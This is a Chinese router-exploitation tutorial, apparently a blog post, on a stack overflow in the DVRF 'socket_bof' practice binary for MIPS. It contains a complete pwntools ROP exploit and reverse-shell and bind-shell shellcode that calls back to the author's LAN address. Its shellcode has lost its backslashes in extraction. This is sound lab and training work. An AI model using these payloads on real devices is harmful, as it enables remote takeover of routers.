> 原文链接: https://www.anquanke.com//post/id/173362 


# 路由器漏洞挖掘之栈溢出——反弹shell的payload构造


                                阅读量   
                                **260753**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/dm/1024_501_/t01017cb10a6f512436.jpg)](https://p3.ssl.qhimg.com/dm/1024_501_/t01017cb10a6f512436.jpg)



## 前言

前一篇讲到了 `ROP` 链的构造，最后直接使用调用 `execve` 函数的 `shellcode` 就可以直接 `getshell`，但是在实际路由器溢出的情况下都不会那么简单。

这里再看一道 `DVRF` 的题，这道题是 `pwnable/ShellCode_Required` 下的 `socket_bof`。



## 漏洞分析

直接查看源码：

```
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

// Pwnable Socket Program
// By b1ack0wl
// Stack Overflow

int main(int argc, char **argv[])
`{`

if (argc &lt;2)`{`

printf("Usage: %s port_number - by b1ack0wln", argv[0]);
exit(1);

`}`

    char str[500] = "";
    char endstr[50] = "";
    int listen_fd, comm_fd;
    int retval = 0;
    int option = 1;

    struct sockaddr_in servaddr;

    listen_fd = socket(AF_INET, SOCK_STREAM, 0);

    bzero( &amp;servaddr, sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htons(INADDR_ANY);
    servaddr.sin_port = htons(atoi(argv[1]));
    printf("Binding to port %in", atoi(argv[1]));

    retval = bind(listen_fd, (struct sockaddr *) &amp;servaddr, sizeof(servaddr));
    if (retval == -1)`{`
    printf("Error Binding to port %in", atoi(argv[1]));
     exit(1);`}`

   if(setsockopt(listen_fd, SOL_SOCKET,SO_REUSEADDR, (char*)&amp;option, sizeof(option)) &lt; 0)`{`
    printf("Setsockopt failed :(n");
    close(listen_fd);
    exit(2);
`}`


    listen(listen_fd, 2);

    comm_fd = accept(listen_fd, (struct sockaddr*) NULL, NULL);

        bzero(str, 500);
    write(comm_fd, "Send Me Bytes:",14);
        read(comm_fd,str,500);
    sprintf(endstr, "nom nom nom, you sent me %s", str);
     printf("Sent back - %s",str);
        write(comm_fd, endstr, strlen(endstr)+1);
    shutdown(comm_fd, SHUT_RDWR);
    shutdown(listen_fd, SHUT_RDWR);
    close(comm_fd);
    close(listen_fd);
return 0x42;
`}`
```

同样这里可以发现一处 `sprintf` 的栈溢出，把程序放入 `IDA` 中进行分析

在 `0x00400D2C` 处调用了 `sprintf` 函数，**将格式化后的字符串直接放到大小为 `0x50` 的栈上**，我们的输入如果大于 0x50 的话就会产生栈溢出，这样我们就可以控制返回地址。

[![](https://i.imgur.com/fEas9Sl.png)](https://i.imgur.com/fEas9Sl.png)

这里和上一道题相似，同样这里需要我们使用 `ROP` 链来构造一个 `payload`。

但是这里不同的是，这里我们是通过端口访问的。**如果我们这里 `getshell` 了，这个 `shell` 还是在服务端的，我们是无法访问的**。所以这里我们需要构造一个通过端口能访问到的 `shellcode`。

这里我们希望的效果是可以直接反弹 `shell` ，或者使得 `shellcode` 能够使服务端在远程某个端口开启一个 `shell` ，我们就可以通过这个端口连接上，进而获取 `shell`。

### <a class="reference-link" name="gdb%20%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95"></a>gdb 调试方法

这里因为程序是开了一个 `socket` 端口，调试方法稍微有点不太一样。但是还是可以用 `attach` 的方法来调试

具体的方法是：
<li>先把程序用 `qemu` 跑起来，附加调试端口为 `23946`
</li>
1. 用 `gdb-multiarch` 连接上 `23946` 端口：`target remote :23946`，程序断在 `_start` 函数处，在 `0x00400E1C` 处下一个断点（也就是 `lw $ra, 0x270+var_4($sp)` 的地方），c 继续运行
[![](https://i.imgur.com/OcDaJYt.png)](https://i.imgur.com/OcDaJYt.png)
1. 再新开一个终端，`nc` 连接上之后，`send payload` 之后就可以在 `gdb` 中进行调试了。
[![](https://i.imgur.com/OmOg2l4.png)](https://i.imgur.com/OmOg2l4.png)

### <a class="reference-link" name="%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB"></a>确定偏移

控制 `ra` 之前还是需要先确定偏移地址。这边还是使用 `patternLocOffset.py` 工具来确定偏移，

```
python patternLocOffset.py -c -l 500 -f test2
```

[![](https://i.imgur.com/ZesQrG2.png)](https://i.imgur.com/ZesQrG2.png)

```
python patternLocOffset.py -s  0x41376241 -l 500
```

可以看到偏移是 51，**后面的四个字节需要填充的 ra 寄存器的值。**

### <a class="reference-link" name="%E6%9E%84%E9%80%A0%20payload"></a>构造 payload

根据上一篇 `ROP` 链构造的思路，**我们同样可以用原来的 `ROP` 链来进行利用**，这里不同的地方是 `shellcode` 的差异，我们需要构造一个能够从端口访问的 `shellcode` 或者直接使用 `socket` 弹回一个 `shell`。
- 在实际的路由器漏洞挖掘过程中，一般的栈溢出使用 `system` 函数来 `getshell` 都会存在问题，所以只能另辟蹊径。
**所以这里的重点是 `shellcode` 构造**。

我们先用原来的 `exp` 试试效果：

```
#!/usr/bin/python
from pwn import *

context.arch = 'mips'
context.endian = 'little'

libc_addr = 0x766e5000
sleep_offset = 0x0002F2B0
# sleep_end_addr = 0x767144c8


shellcode = ""


shellcode += "xffxffx06x28"  # slti $a2, $zero, -1
shellcode += "x62x69x0fx3c"  # lui $t7, 0x6962
shellcode += "x2fx2fxefx35"  # ori $t7, $t7, 0x2f2f
shellcode += "xf4xffxafxaf"  # sw $t7, -0xc($sp)
shellcode += "x73x68x0ex3c"  # lui $t6, 0x6873
shellcode += "x6ex2fxcex35"  # ori $t6, $t6, 0x2f6e
shellcode += "xf8xffxaexaf"  # sw $t6, -8($sp)
shellcode += "xfcxffxa0xaf"  # sw $zero, -4($sp)
shellcode += "xf4xffxa4x27"  # addiu $a0, $sp, -0xc
shellcode += "xffxffx05x28"  # slti $a1, $zero, -1
shellcode += "xabx0fx02x24"  # addiu;$v0, $zero, 0xfab
shellcode += "x0cx01x01x01"  # syscall 0x40404



payload = 'a' * 51
payload += p32(libc_addr + 0xAfe0)    # jr $ra


payload += 'b' * (0x3c - 4 * 9)
payload += 'a' * 4                               # s0
payload += p32(libc_addr + 0x21C34)              # s1
payload += 'a' * 4                               # s2
payload += p32(libc_addr + sleep_offset)         # s3
payload += 'a' * 4                               # s4
payload += 'a' * 4                               # s5
payload += 'a' * 4                               # s6
payload += 'a' * 4                               # s7
payload += 'a' * 4                               # fp
payload += p32(libc_addr + 0x2FB10)              # ra


#---------------stack 2-------------------

payload += 'c' * 0x24
payload += p32(libc_addr + 0x000214A0)           # s3
payload += 'd' * 4                               # s4
payload += p32(libc_addr + 0xAfe0)               # ra

#---------------stack 3-------------------
payload += 'a' * (0x3c-4*9)
payload += p32(libc_addr + 0x000214A0)       # s0
payload += 'a' * 4                               # s1
payload += 'a' * 4                               # s2
payload += 'a' * 4                               # s3
payload += 'a' * 4                               # s4
payload += 'a' * 4                               # s5
payload += 'a' * 4                               # s6
payload += 'a' * 4                               # s7
payload += 'a' * 4                               # fp
payload += p32(libc_addr + 0x0001B230)           # ra


payload += 'f' * 0x28
payload += shellcode


r = remote('127.0.0.1',55555)
r.recvuntil('Send Me Bytes:')

r.sendline(payload)

r.interactive()
```

运行起来，在服务端可以看到，这里确实可以 `getshell`。

[![](https://i.imgur.com/YLmzCTJ.png)](https://i.imgur.com/YLmzCTJ.png)

### <a class="reference-link" name="shellcode%20%E7%9A%84%E9%80%89%E6%8B%A9%E5%92%8C%E6%9E%84%E9%80%A0"></a>shellcode 的选择和构造

这里的 `shellcode` 可以选择两种类型，**一种是在本地传一个 `shell` 绑定到某个端口，另一种是直接反弹 `shell`。**

这里的 `shellcode` 可以自己开发，也可以直接用网上现成的。自己开发的话比较耗时难度也比较大，这边就直接使用[这里的](http://shell-storm.org/shellcode/)。

#### <a class="reference-link" name="%E5%8F%8D%E5%BC%B9%20shell"></a>反弹 shell

先选择一个反弹 `shell` 的 `shellcode`，在下面这个链接中，可以看到这边是将 `shell` 反弹到了 `192.168.1.177` 这个 ip 的 `31337` 端口。

[http://shell-storm.org/shellcode/files/shellcode-860.php](http://shell-storm.org/shellcode/files/shellcode-860.php)

我们使用的话之**直接更改他的 ip 地址就行了**，也就是对 `li $a1, 0xB101A8C0 #192.168.1.177` 这条汇编指令进行更改。

如何更改呢？这边就需要用到 `pwntools` 的 `asm` 函数。

首先，我们需要把目的 ip 地址转化为 16 进制，这里就拿笔者本机来演示。这里我本机的 IP 是 `192.168.123.158`

[![](https://i.imgur.com/YXsFenP.png)](https://i.imgur.com/YXsFenP.png)

转化成 16 进制为：`0x9e7ba8c0`

[![](https://i.imgur.com/8gftjlN.png)](https://i.imgur.com/8gftjlN.png)

那么这里的汇编语句就是：`li $a1,0x9e7ba8c0`

导入 `pwntools.asm` 函数中：

[![](https://i.imgur.com/uwsqp1i.png)](https://i.imgur.com/uwsqp1i.png)

得到相应汇编语句的 `hex` 值，替换掉 `payload` 原来的 `hex` 值就行了。即：

```
stg3_SC = "xffxffx04x28xa6x0fx02x24x0cx09x09x01x11x11x04x28"
stg3_SC += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
stg3_SC += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
stg3_SC += "x27x28x80x01xffxffx06x28x57x10x02x24x0cx09x09x01"
stg3_SC += "xffxffx44x30xc9x0fx02x24x0cx09x09x01xc9x0fx02x24"
stg3_SC += "x0cx09x09x01x79x69x05x3cx01xffxa5x34x01x01xa5x20"
#stg3_SC += "xf8xffxa5xafx01xb1x05x3cxc0xa8xa5x34xfcxffxa5xaf"          # 192.168.1.177
stg3_SC += "xf8xffxa5xafx7bx9ex05x3cxc0xa8xa5x34xfcxffxa5xaf"           # 192.168.123.158
stg3_SC += "xf8xffxa5x23xefxffx0cx24x27x30x80x01x4ax10x02x24"
stg3_SC += "x0cx09x09x01x62x69x08x3cx2fx2fx08x35xecxffxa8xaf"
stg3_SC += "x73x68x08x3cx6ex2fx08x35xf0xffxa8xafxffxffx07x28"
stg3_SC += "xf4xffxa7xafxfcxffxa7xafxecxffxa4x23xecxffxa8x23"
stg3_SC += "xf8xffxa8xafxf8xffxa5x23xecxffxbdx27xffxffx06x28"
stg3_SC += "xabx0fx02x24x0cx09x09x01"
```

`nc` 监听 31337 端口，运行 `exp` 成功反弹一个 `shell`：

[![](https://i.imgur.com/34daD5I.png)](https://i.imgur.com/34daD5I.png)

[![](https://i.imgur.com/nmruOmM.png)](https://i.imgur.com/nmruOmM.png)

#### <a class="reference-link" name="%E7%BB%91%E5%AE%9A%E5%88%B0%E7%9B%B8%E5%BA%94%E7%AB%AF%E5%8F%A3"></a>绑定到相应端口

这里的 shellcode 使用这里的：<br>[http://shell-storm.org/shellcode/files/shellcode-81.php](http://shell-storm.org/shellcode/files/shellcode-81.php)

也就是开启一个 `bash` 监听本地的 `4919` 端口。

```
bind_port_shellcode = "xe0xffxbdx27xfdxffx0ex24x27x20xc0x01x27x28xc0x01xffxffx06x28x57x10x02x24x0cx01x01x01x50x73x0fx24xffxffx50x30xefxffx0ex24x27x70xc0x01x13x37x0dx24x04x68xcdx01xffxfdx0ex24x27x70xc0x01x25x68xaex01xe0xffxadxafxe4xffxa0xafxe8xffxa0xafxecxffxa0xafx25x20x10x02xefxffx0ex24x27x30xc0x01xe0xffxa5x23x49x10x02x24x0cx01x01x01x50x73x0fx24x25x20x10x02x01x01x05x24x4ex10x02x24x0cx01x01x01x50x73x0fx24x25x20x10x02xffxffx05x28xffxffx06x28x48x10x02x24x0cx01x01x01x50x73x0fx24xffxffx50x30x25x20x10x02xfdxffx0fx24x27x28xe0x01xdfx0fx02x24x0cx01x01x01x50x73x0fx24x25x20x10x02x01x01x05x28xdfx0fx02x24x0cx01x01x01x50x73x0fx24x25x20x10x02xffxffx05x28xdfx0fx02x24x0cx01x01x01x50x73x0fx24x50x73x06x24xffxffxd0x04x50x73x0fx24xffxffx06x28xdbxffx0fx24x27x78xe0x01x21x20xefx03xf0xffxa4xafxf4xffxa0xafxf0xffxa5x23xabx0fx02x24x0cx01x01x01/bin/sh"
```

直接替换原来 `payload`：

[![](https://i.imgur.com/x9GAw25.png)](https://i.imgur.com/x9GAw25.png)

但是这里有点问题，执行完 exp 却开启了别的端口，直接连接上去程序会直接崩溃。所以还是使用上面反弹 `shell` 的 exp 吧。

[![](https://i.imgur.com/ajF3ubQ.png)](https://i.imgur.com/ajF3ubQ.png)

### <a class="reference-link" name="exp"></a>exp

```
#!/usr/bin/python
from pwn import *

context.arch = 'mips'
context.endian = 'little'

libc_addr = 0x766e5000
sleep_offset = 0x0002F2B0

stg3_SC = ""
stg3_SC = "xffxffx04x28xa6x0fx02x24x0cx09x09x01x11x11x04x28"
stg3_SC += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
stg3_SC += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
stg3_SC += "x27x28x80x01xffxffx06x28x57x10x02x24x0cx09x09x01"
stg3_SC += "xffxffx44x30xc9x0fx02x24x0cx09x09x01xc9x0fx02x24"
stg3_SC += "x0cx09x09x01x79x69x05x3cx01xffxa5x34x01x01xa5x20"
stg3_SC += "xf8xffxa5xafx7bx9ex05x3cxc0xa8xa5x34xfcxffxa5xaf"         # 192.168.123.158
stg3_SC += "xf8xffxa5x23xefxffx0cx24x27x30x80x01x4ax10x02x24"
stg3_SC += "x0cx09x09x01x62x69x08x3cx2fx2fx08x35xecxffxa8xaf"
stg3_SC += "x73x68x08x3cx6ex2fx08x35xf0xffxa8xafxffxffx07x28"
stg3_SC += "xf4xffxa7xafxfcxffxa7xafxecxffxa4x23xecxffxa8x23"
stg3_SC += "xf8xffxa8xafxf8xffxa5x23xecxffxbdx27xffxffx06x28"
stg3_SC += "xabx0fx02x24x0cx09x09x01"



payload = 'a' * 51
payload += p32(libc_addr + 0xAfe0)    # jr $ra


payload += 'b' * (0x3c - 4 * 9)
payload += 'a' * 4                               # s0
payload += p32(libc_addr + 0x21C34)              # s1
payload += 'a' * 4                               # s2
payload += p32(libc_addr + sleep_offset)         # s3
payload += 'a' * 4                               # s4
payload += 'a' * 4                               # s5
payload += 'a' * 4                               # s6
payload += 'a' * 4                               # s7
payload += 'a' * 4                               # fp
payload += p32(libc_addr + 0x2FB10)              # ra


#---------------stack 2-------------------

payload += 'c' * 0x24
payload += p32(libc_addr + 0x000214A0)           # s3
payload += 'd' * 4                               # s4
payload += p32(libc_addr + 0xAfe0)               # ra

#---------------stack 3-------------------
payload += 'a' * (0x3c-4*9)
payload += p32(libc_addr + 0x000214A0)       # s0
payload += 'a' * 4                               # s1
payload += 'a' * 4                               # s2
payload += 'a' * 4                               # s3
payload += 'a' * 4                               # s4
payload += 'a' * 4                               # s5
payload += 'a' * 4                               # s6
payload += 'a' * 4                               # s7
payload += 'a' * 4                               # fp
payload += p32(libc_addr + 0x0001B230)           # ra


payload += 'f' * 0x28
payload += stg3_SC

r = remote('127.0.0.1',55555)
r.recvuntil('Send Me Bytes:')

r.sendline(payload)

r.interactive()
```



## 总结

在实际的路由器栈溢出时，如果执行 `execve` 函数没办法 `getshell` 时，可以试试上面反弹 `shell` 的方式。
